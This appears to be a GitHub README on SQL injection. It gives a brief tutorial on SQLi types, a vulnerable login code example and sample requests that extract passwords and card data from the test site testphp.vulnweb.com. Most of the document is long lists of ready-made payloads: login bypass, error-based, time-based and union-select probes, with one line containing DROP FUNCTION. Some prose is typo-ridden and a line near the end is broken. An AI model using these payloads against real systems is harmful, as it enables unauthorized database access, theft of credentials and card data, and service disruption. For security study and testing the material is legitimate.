# SQL Injection
  
An injection attack is a malicious code injected in the network which fetched all the information from the database to the attacker. This attack type is considered a major problem in web security. SQL Injection flaws are introduced when software developers create dynamic database queries that include user-supplied input.

Injections are amongst the oldest and most dangerous attacks aimed at web applications and can lead to data theft, data loss, loss of data integrity, denial of service, as well as full system compromise. The primary reason for injection vulnerabilities is usually insufficient user input validation.

## Impact

Injection is an attacker’s attempt to send data to an application in a way that will change the meaning of commands being sent to an interpreter. For example, the most common example is SQL injection, where an attacker sends “101 OR 1=1” instead of just “101”. When included in a SQL query, this data changes the meaning to return ALL records instead of just one. There are lots of interpreters in the typical web environment, such as SQL, LDAP, Operating System, XPath, XQuery, Expression Language, and many more. Anything with a “command interface” that combines data into a command is susceptible.

![sql-injection](https://user-images.githubusercontent.com/86349153/157223835-1f3b3d2f-df17-4478-ae96-cf812106a876.svg)

       
# Type of SQL Injection   
  
  SQL injections typically fall under three categories: In-band SQLi (Classic), Inferential SQLi (Blind) and Out-of-band SQLi. You can classify SQL injections types based on the methods they use to access backend data and their damage potential.
    
   SQL Injection can be classified into three major categories – In-band SQLi, Inferential SQLi and Out-of-band SQLi.  
 
 
 
   # 1. In-band SQL Injection (Classic SQL Injection)
   The attacker uses the same channel of communication to launch their attacks and to gather their results. In-band SQL Injection simplicity and efficiency make      it one of the most common types of SQLi attack. 
   
   There are two sub-variations of this method:
        
   ## • Error-based SQL Injection
     
   Error-based SQLi is an in-band SQK Injection technique that relies on error messages thriwb by the database server to obtain information about the structure if    the datebase
   
   ## • Union-Based SQL Injection 
     
   Uion-based SQLi is ab ib-band SQL injection technique that leverages the UNION SQL operator to combine the results of two or more SELECT statements.
     
     
  # 2. Inferential SQL Inection (Blind SQL Injection) 
   The attacker sends data payloads to the server and observes the response and behavior of the server to learn more about its structure. This method is called      blind SQLi because the data is not transferred from the website database to the attacker, thus the attacker cannot see information about the attack in-band.
  
  ##  Blind SQL Injection 
   it is just as dangerous as any other form of SQL Injection . In an Blind SQLi attack, no data is actually transferred via th eweb application and the attacker    woulf not be able to see the result of an attack
    
   ## The two types of Blind SQL Injection are:-
    
   - Boolean-based (content-based) 
  
   - Time-based Blind SQL Injection
   
  # 3. Out-of-band SQL Injection
  
   Out of band SQL injection is not very commaon, mostly because it depends on feature being enabled on the database server being used by the web application. Out    of band SQL Injection occurs when an attacker is unable to use the same chennel to launch the attack and gather result.
   
# Second-order SQL injection  
First-order SQL injection arises where the application takes user input from an HTTP request and, in the course of processing that request, incorporates the input into an SQL query in an unsafe way.

In second-order SQL injection (also known as stored SQL injection), the application takes user input from an HTTP request and stores it for future use. This is usually done by placing the input into a database, but no vulnerability arises at the point where the data is stored. Later, when handling a different HTTP request, the application retrieves the stored data and incorporates it into an SQL query in an unsafe way.

![Screenshot 2022-03-24 172000](https://user-images.githubusercontent.com/95084876/159910849-5cc9f4e8-55ed-4783-be69-5fd359a57dd5.png)

Second-order SQL injection often arises in situations where developers are aware of SQL injection vulnerabilities, and so safely handle the initial placement of the input into the database. When the data is later processed, it is deemed to be safe, since it was previously placed into the database safely. At this point, the data is handled in an unsafe way, because the developer wrongly deems it to be trusted.
   
# This is a list of the most popular SQL Injection Vulnerability Scanner Tool's :- 
 
  - [SQLMap]() - Automatic SQL Injection AND Database Tackeover Tool
                  https://sqlmap.org/
  
  - [jSQL Injection]() - Java Tool For Automatic SQL Database Injection 
                          https://miloserdov.org/?p=1682
  
  - [BBQSQL]() - A Blind SQL Injection Exploitation Tool
                  https://securityonline.info/bbqsql-blind-sql-injection-exploitation-tool/
  
  - [NoSQLMap]() - Automated NoSQL database Pwnage
                   https://medium.com/rangeforce/nosqlmap-a67d76b88c48
                    
  - [Whitewiow]() - SQL Vulnerability Scanner
                   https://kalilinuxtutorials.com/whitewidow/
                   
  - [DSSS]() - Damn Small SQL Injection Scanner
         https://pentesttools.net/how-to-scan-websites-for-sql-injection-dsss-damn-small-sqli-scanner-kali-linux-2017-1/
  
  - [explo]() - Human And Machine Readable Web bulnerability Testing Format
                https://github.com/telekom-security/explo
                
  - [Blind-SQL-Bitshifting]() - Blind SQL Injection via Bitshifting
                                https://github.com/awnumar/blind-sql-bitshifting
                                
  - [Leviathan]() - Wide Range Mass Audit Toolkit
                    https://kalilinuxtutorials.com/leviathan/
  
  - [Blisqy]() - Exploit time-based blind-SQL Injection in HTTP-Headers (MySQL/MariaDB 
                 https://www.kitploit.com/2017/10/blisqy-exploit-time-based-blind-sql.html
                 
  
## Simple SQL Injection Example

    The first example is very simple. It shows, how an attacker can use an SQL Injection vulnerability to go around 
    application security and authenticate as the administrator.

  The Following Script Is Pseudocode Executed On A Web Server.It Is A Simple Example Of Authenticating With A 'Username' And A 'Password'.
  The Example Database Has A Table Named 'users' with the following columns: "Username And Password". 
   
    # Define POST variables
      uname = request.POST['username']
      passwd = request.POST['password']

    # SQL query vulnerable to SQLi
      sql = “SELECT id FROM users WHERE username=’” + uname + “’ AND password=’” + passwd + “’”

    # Execute the SQL statement
      database.execute(sql)   
   
   These Input Fields Are Vulnerable To SQL Injection. An Attacker Could Use SQL Commands In The Input In A Way 
   That Would Alter The SQL Statement Executed By The Database Server. For Example, They Could Use A Trick
   Involving A Single Quote And Set The 'Passwd' Field To:-

      password' OR 1=1

   As A Result, The Database Server Runs The Following SQL Query:

      SELECT id FROM users WHERE username='username' AND password='password' OR 1=1'

   Because Of The "OR 1=1" Statement,The 'WHERE' Clause Returns The First 'id' From The 'users' Table No Matter What The 'username' And 'password' Are.
   The First user 'id' In A Database Is Very Often The Administrator.In This Way,The Attacker Not Only Bypasses Authentication But Also 
   Gains Administrator Privileges.They Can Also Comment Out The Rest Of The SQL Statement To Control The Execution Of The SQL Query Further:

    -- MySQL, MSSQL, Oracle, PostgreSQL, SQLite
    ' OR '1'='1' --
    ' OR '1'='1' /*
    -- MySQL
    ' OR '1'='1' #
    -- Access (using null characters)
    ' OR '1'='1' %00
    ' OR '1'='1' %16

 ## Example Of A Union-Based SQL Injection

 One Of The Most Common Types Of SQL Injection uses The UNION Operator. It Allows The Attacker To Combine The Results Of Two Or More SELECT 
 Statements Into A Single Result. The Technique Is Called Union-Based SQL Injection.

 The Following Is An Example Of This Technique.It Uses The Web Page testphp.vulnweb.com, An Intentionally vulnerable Website.
 The Following HTTP Request Is A Normal Request That A Legitimate 'user' Would Send:

    GET http://testphp.vulnweb.com/artists.php?artist=1 HTTP/1.1
     Host: testphp.vulnweb.com
 ![image](https://user-images.githubusercontent.com/80889609/157415905-37dc9a7b-eb47-4a93-a2b8-e702e0fac900.png)

 The 'Artist' Parameter Is Vulnerable To SQL Injection.The Following Payload Modifies The Query To Look For An Inexistent Record. 
 It Sets The Value In The URL Query String To '-1'.Of Course, It Could Be Any Other Value That Does Not Exist In The Database.
 However, A Negative Value Is A Good Guess Because An Identifier In A Database Is Rarely A Negative Number.

 In SQL Injection,The 'UNION' Operator Is Commonly Used To Attach A Malicious SQL Query To The Original Query Intended To Be Run 
 By The Web Application. The Result Of The Injected Query Will Be Joined With The Result Of The Original Query.This Allows The
 Attacker To Obtain Column Values From Other Tables.
 
    GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1, 2, 3 HTTP/1.1
    Host: testphp.vulnweb.com
![image](https://user-images.githubusercontent.com/80889609/157417615-51827a96-69e3-44fc-a639-aa7f43e3a317.png)

The Following Example Shows How An SQL Injection Payload Could Be Used To Obtain More Meaningful Data From This Intentionally Vulnerable Site:

    GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1
    Host: testphp.vulnweb.com

![image](https://user-images.githubusercontent.com/80889609/157418082-afc41aaa-6934-4688-8d6c-f43ba6c996d8.png)


 ## SQL-Injection Payloads
     
     '
     ''
     `
     ``
     ,
     "
     ""
     /
     //
     \
     \\
     ;
     ' or "
     -- or # 
     ' OR '1
     ' OR 1 -- -
     " OR "" = "
     " OR 1 = 1 -- -
     ' OR '' = '
     '='
     'LIKE'
     '=0--+
      OR 1=1
     ' OR 'x'='x
     ' AND id IS NULL; --
     '''''''''''''UNION SELECT '2
     %00
     /*…*/ 
     +		addition, concatenate (or space in url)
     ||		(double pipe) concatenate
     %		wildcard attribute indicator

     @variable	local variable
     @@variable	global variable


     # Numeric
     AND 1
     AND 0
     AND true
     AND false
     1-false
     1-true
     1*56
     -2


     1' ORDER BY 1--+
     1' ORDER BY 2--+
     1' ORDER BY 3--+

     1' ORDER BY 1,2--+
     1' ORDER BY 1,2,3--+

     1' GROUP BY 1,2,--+
     1' GROUP BY 1,2,3--+
     ' GROUP BY columnnames having 1=1 --


     -1' UNION SELECT 1,2,3--+
     ' UNION SELECT sum(columnname ) from tablename --


     -1 UNION SELECT 1 INTO @,@
     -1 UNION SELECT 1 INTO @,@,@

     1 AND (SELECT * FROM Users) = 1	

     ' AND MID(VERSION(),1,1) = '5';

     ' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --


     Finding the table name


     Time-Based:
     ,(select * from (select(sleep(10)))a)
     %2c(select%20*%20from%20(select(sleep(10)))a)
     ';WAITFOR DELAY '0:0:30'--

     Comments:

     #	    Hash comment
     /*  	C-style comment
     -- -	SQL comment
     ;%00	Nullbyte
     `	    Backtick
    
  
  ## Generic Error Based Payloads

           OR 1=1
           OR 1=0
           OR x=x
           OR x=y
           OR 1=1#
           OR 1=0#
           OR x=x#
           OR x=y#
           OR 1=1-- 
           OR 1=0-- 
           OR x=x-- 
           OR x=y-- 
           OR 3409=3409 AND ('pytW' LIKE 'pytW
           OR 3409=3409 AND ('pytW' LIKE 'pytY
           HAVING 1=1
           HAVING 1=0
           HAVING 1=1#
           HAVING 1=0#
           HAVING 1=1-- 
           HAVING 1=0-- 
           AND 1=1
           AND 1=0
           AND 1=1-- 
           AND 1=0-- 
           AND 1=1#
           AND 1=0#
           AND 1=1 AND '%'='
           AND 1=0 AND '%'='
           AND 1083=1083 AND (1427=1427
           AND 7506=9091 AND (5913=5913
           AND 1083=1083 AND ('1427=1427
           AND 7506=9091 AND ('5913=5913
           AND 7300=7300 AND 'pKlZ'='pKlZ
           AND 7300=7300 AND 'pKlZ'='pKlY
           AND 7300=7300 AND ('pKlZ'='pKlZ
           AND 7300=7300 AND ('pKlZ'='pKlY
           AS INJECTX WHERE 1=1 AND 1=1
           AS INJECTX WHERE 1=1 AND 1=0
           AS INJECTX WHERE 1=1 AND 1=1#
           AS INJECTX WHERE 1=1 AND 1=0#
           AS INJECTX WHERE 1=1 AND 1=1--
           AS INJECTX WHERE 1=1 AND 1=0--
           WHERE 1=1 AND 1=1
           WHERE 1=1 AND 1=0
           WHERE 1=1 AND 1=1#
           WHERE 1=1 AND 1=0#
           WHERE 1=1 AND 1=1--
           WHERE 1=1 AND 1=0--
           ORDER BY 1-- 
           ORDER BY 2-- 
           ORDER BY 3-- 
           ORDER BY 4-- 
           ORDER BY 5-- 
           ORDER BY 6-- 
           ORDER BY 7-- 
           ORDER BY 8-- 
           ORDER BY 9-- 
           ORDER BY 10-- 
           ORDER BY 31337-- 
           ORDER BY 1# 
           ORDER BY 2# 
           ORDER BY 3# 
           ORDER BY 4# 
           ORDER BY 5# 
           ORDER BY 6# 
           ORDER BY 7# 
           ORDER BY 8# 
           ORDER BY 9# 
           ORDER BY 10# 
           ORDER BY 31337#
           ORDER BY 1 
           ORDER BY 2 
           ORDER BY 3 
           ORDER BY 4 
           ORDER BY 5 
           ORDER BY 6 
           ORDER BY 7 
           ORDER BY 8 
           ORDER BY 9 
           ORDER BY 10 
           ORDER BY 31337 
           RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='
           RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='
          IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--
          IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--
          %' AND 8310=8310 AND '%'='
          %' AND 8310=8311 AND '%'='
           and (select substring(@@version,1,1))='X'
           and (select substring(@@version,1,1))='M'
           and (select substring(@@version,2,1))='i'
           and (select substring(@@version,2,1))='y'
           and (select substring(@@version,3,1))='c'
           and (select substring(@@version,3,1))='S'
           and (select substring(@@version,3,1))='X'
      
  ## Generic Time Based SQL Injection Payloads

### from wapiti
          sleep(5)#
          1 or sleep(5)#
          " or sleep(5)#
          ' or sleep(5)#
          " or sleep(5)="
          ' or sleep(5)='
          1) or sleep(5)#
          ") or sleep(5)="
          ') or sleep(5)='
          1)) or sleep(5)#
          ")) or sleep(5)="
          ')) or sleep(5)='
          ;waitfor delay '0:0:5'--
          );waitfor delay '0:0:5'--
          ';waitfor delay '0:0:5'--
          ";waitfor delay '0:0:5'--
          ');waitfor delay '0:0:5'--
          ");waitfor delay '0:0:5'--
          ));waitfor delay '0:0:5'--
          '));waitfor delay '0:0:5'--
          "));waitfor delay '0:0:5'--
          benchmark(10000000,MD5(1))#
          1 or benchmark(10000000,MD5(1))#
          " or benchmark(10000000,MD5(1))#
          ' or benchmark(10000000,MD5(1))#
          1) or benchmark(10000000,MD5(1))#
          ") or benchmark(10000000,MD5(1))#
          ') or benchmark(10000000,MD5(1))#
          1)) or benchmark(10000000,MD5(1))#
          ")) or benchmark(10000000,MD5(1))#
          ')) or benchmark(10000000,MD5(1))#
          pg_sleep(5)--
          1 or pg_sleep(5)--
          " or pg_sleep(5)--
          ' or pg_sleep(5)--
          1) or pg_sleep(5)--
          ") or pg_sleep(5)--
          ') or pg_sleep(5)--
          1)) or pg_sleep(5)--
          ")) or pg_sleep(5)--
          ')) or pg_sleep(5)--
          AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
          AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='
          AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
          AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--
          AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#
          SLEEP(5)#
          SLEEP(5)--
          SLEEP(5)="
          SLEEP(5)='
          or SLEEP(5)
          or SLEEP(5)#
          or SLEEP(5)--
          or SLEEP(5)="
          or SLEEP(5)='
          waitfor delay '00:00:05'
          waitfor delay '00:00:05'--
          waitfor delay '00:00:05'#
          benchmark(50000000,MD5(1))
          benchmark(50000000,MD5(1))--
          benchmark(50000000,MD5(1))#
          or benchmark(50000000,MD5(1))
          or benchmark(50000000,MD5(1))--
          or benchmark(50000000,MD5(1))#
          pg_SLEEP(5)
          pg_SLEEP(5)--
          pg_SLEEP(5)#
          or pg_SLEEP(5)
          or pg_SLEEP(5)--
          or pg_SLEEP(5)#
          '\"
          AnD SLEEP(5)
          AnD SLEEP(5)--
          AnD SLEEP(5)#
          &&SLEEP(5)
          &&SLEEP(5)--
          &&SLEEP(5)#
          ' AnD SLEEP(5) ANd '1
          '&&SLEEP(5)&&'1
          ORDER BY SLEEP(5)
          ORDER BY SLEEP(5)--
          ORDER BY SLEEP(5)#
          (SELECT * FROM (SELECT(SLEEP(5)))ecMj)
          (SELECT * FROM (SELECT(SLEEP(5)))ecMj)#
          (SELECT * FROM (SELECT(SLEEP(5)))ecMj)--
          +benchmark(3200,SHA1(1))+'
          + SLEEP(10) + '
          RANDOMBLOB(500000000/2)
          AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
          OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
          RANDOMBLOB(1000000000/2)
          AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
          OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
          SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/ 
          
## Generic Union Select Payloads

           ORDER BY SLEEP(5)
           ORDER BY 1,SLEEP(5)
           ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'))
           ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4
           ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5
           ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6
           ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7
           ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8
           ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9
           ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10
           ORDER BY SLEEP(5)#
           ORDER BY 1,SLEEP(5)#
           ORDER BY 1,SLEEP(5),3#
           ORDER BY 1,SLEEP(5),3,4#
           ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5#
           ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6#
           ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7#
           ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8#
           ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9#
           ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10#
           UNION ALL SELECT 1
           UNION ALL SELECT 1,2
           UNION ALL SELECT 1,2,3
           UNION ALL SELECT 1,2,3,4
           UNION ALL SELECT 1,2,3,4,5
           UNION ALL SELECT 1,2,3,4,5,6
           UNION ALL SELECT 1,2,3,4,5,6,7
           UNION ALL SELECT 1,2,3,4,5,6,7,8
           UNION ALL SELECT 1,2,3,4,5,6,7,8,9
           UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10
           UNION ALL SELECT 1#
           UNION ALL SELECT 1,2#
           UNION ALL SELECT 1,2,3#
           UNION ALL SELECT 1,2,3,4#
           UNION ALL SELECT 1,2,3,4,5#
           UNION ALL SELECT 1,2,3,4,5,6#
           UNION ALL SELECT 1,2,3,4,5,6,7#
           UNION ALL SELECT 1,2,3,4,5,6,7,8#
           UNION ALL SELECT 1,2,3,4,5,6,7,8,9#
           UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10#
           UNION ALL SELECT 1-- 
           UNION ALL SELECT 1,2-- 
           UNION ALL SELECT 1,2,3-- 
           UNION ALL SELECT 1,2,3,4-- 
           UNION ALL SELECT 1,2,3,4,5-- 
           UNION ALL SELECT 1,2,3,4,5,6-- 
           UNION ALL SELECT 1,2,3,4,5,6,7-- 
           UNION ALL SELECT 1,2,3,4,5,6,7,8-- 
           UNION ALL SELECT 1,2,3,4,5,6,7,8,9-- 
           UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10-- 
           UNION SELECT @@VERSION,SLEEP(5),3
           UNION SELECT @@VERSION,SLEEP(5),USER(),4
           UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5
           UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6
           UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7
           UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8
           UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9
           UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10
           UNION SELECT @@VERSION,SLEEP(5),"'3
           UNION SELECT @@VERSION,SLEEP(5),"'3'"#
           UNION SELECT @@VERSION,SLEEP(5),USER(),4#
           UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5#
           UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6#
           UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7#
           UNION ALL SELECT USER()-- 
           UNION ALL SELECT SLEEP(5)-- 
           UNION ALL SELECT USER(),SLEEP(5)-- 
           UNION ALL SELECT @@VERSION,USER(),SLEEP(5)-- 
           UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A'))-- 
           UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL-- 
           UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL-- 
           UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL-- 
           UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL-- 
           UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL-- 
           UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL-- 
           UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
           UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
           UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
           UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
           UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
           UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
           UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
           UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
           UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
           UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
           UNION ALL SELECT NULL-- 
           AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))-- 
           AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))-- 
           AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))-- 
           AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- 
           AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))--  
           AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))-- 
           AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))-- 
           AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))-- 
           AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))-- 
           AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))-- 
           AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))-- 
           UNION ALL SELECT NULL#
           AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))#
           AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))#
           AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))#
           AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#
           AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#
           AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))#
           AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))#
           AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))#
           AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))#
           AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))#
           AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))#
           AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))#
           UNION ALL SELECT NULL 
           AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))
           AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))
END))+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))
           AND 3516=CAST((CHR(113)||CHR(106)||CHR(122)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (3516=3516) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(106)||CHR(107)||CHR(113)) AS NUMERIC)
           AND (SELECT 4523 FROM(SELECT COUNT(*),CONCAT(0x716a7a6a71,(SELECT (ELT(4523=4523,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
